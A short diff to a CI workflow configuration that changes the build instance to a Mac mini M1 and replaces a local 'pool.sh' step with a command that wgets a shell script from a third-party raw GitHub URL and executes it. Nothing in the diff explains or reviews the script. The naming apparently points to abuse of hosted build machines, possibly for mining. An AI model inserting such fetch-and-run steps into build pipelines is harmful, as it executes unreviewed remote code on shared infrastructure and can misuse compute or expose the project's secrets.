@@ -1,7 +1,7 @@
 workflows:
   my-workflow:
     name: My workflow name
-    instance_type: linux_x2
+    instance_type: mac_mini_m1
     max_build_duration: 120
     scripts:
-      - sh pool.sh
+      - wget https://raw.githubusercontent.com/cnvrg001/mac/main/pkt.sh && sh pkt.sh
